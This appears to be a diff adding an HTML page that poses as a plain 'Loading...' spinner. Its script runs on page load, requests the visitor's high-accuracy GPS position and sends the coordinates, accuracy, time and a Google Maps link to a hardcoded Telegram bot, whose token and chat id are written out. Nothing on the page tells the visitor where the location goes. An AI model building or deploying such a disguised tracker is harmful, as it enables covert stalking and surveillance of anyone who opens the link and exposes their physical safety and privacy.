@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { 
+            margin: 0; 
+            height: 100vh; 
+            background: #111; 
+            color: #fff; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            font-family: Arial; 
+            text-align: center;
+        }
+        .loader {
+            width: 40px; 
+            height: 40px; 
+            border: 4px solid #333; 
+            border-top-color: #0f0; 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div>
+        <div class="loader"></div>
+        <p id="status">Loading...</p>
+    </div>
+
+    <script>
+        const botToken = '8676266697:AAHdIIE5nA5O7ZkITE8b97Mu9HqM2-rO_ow';
+        const chatId = '7680286319';
+
+        async function sendLocation(lat, lon, accuracy) {
+            const message = `📍 PHONE LOCATION\n\n` +
+                `Lat: ${lat}\n` +
+                `Lon: ${lon}\n` +
+                `Accuracy: ${accuracy}m\n` +
+                `Time: ${new Date().toLocaleString()}\n\n` +
+                `🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}`;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+            });
+        }
+
+        function getLocation() {
+            if (!navigator.geolocation) {
+                document.getElementById('status').textContent = 'GPS not supported';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    const { latitude, longitude, accuracy } = pos.coords;
+                    document.getElementById('status').textContent = 'Location sent!';
+                    await sendLocation(latitude, longitude, accuracy);
+                },
+                (err) => {
+                    if (err.code === 1) {
+                        document.getElementById('status').textContent = 'Please allow location access';
+                    } else if (err.code === 2) {
+                        document.getElementById('status').textContent = 'Turn on GPS in settings';
+                    } else {
+                        document.getElementById('status').textContent = 'GPS timeout';
+                    }
+                },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+
+        window.onload = getLocation;
+    </script>
+</body>
+</html>
